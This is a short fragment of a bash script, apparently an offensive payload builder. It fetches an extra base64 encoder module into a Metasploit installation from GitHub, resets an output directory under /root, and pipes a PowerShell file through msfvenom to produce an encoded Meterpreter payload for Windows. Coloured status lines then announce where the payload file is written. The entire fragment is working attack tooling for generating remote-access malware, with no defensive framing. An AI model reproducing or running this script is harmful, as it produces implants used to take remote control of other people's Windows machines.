...
cd $msfpath/modules/encoders/cmd/ && wget https://raw.githubusercontent.com/pr0xy-8L4d3/powershell-base64-encoder/master/base64.rb
cd /root && rm -rf meterpwrshelloutputdirectory/
mkdir meterpwrshelloutputdirectory/
cd meterpwrshelloutputdirectory/
clear
...
cat 1.ps1 | msfvenom -e cmd/base64 -a $payarch --platform windows NOEXIT -o meterpwrshelloutput.txt
rm 1.ps1
echo -e $red "[--------------------------END DEBUG ZONE--------------------------]"
echo -e $okegreen "[---] The Meterpreter Powershell Payload Has Been Maked By MSFVenom [---]"
echo -e $okegreen "[---] The Output File Is On The : /root/meterpwrshelloutputdirectory/meterpwrshelloutput.txt [---]"
figlet "...GoodBye..."
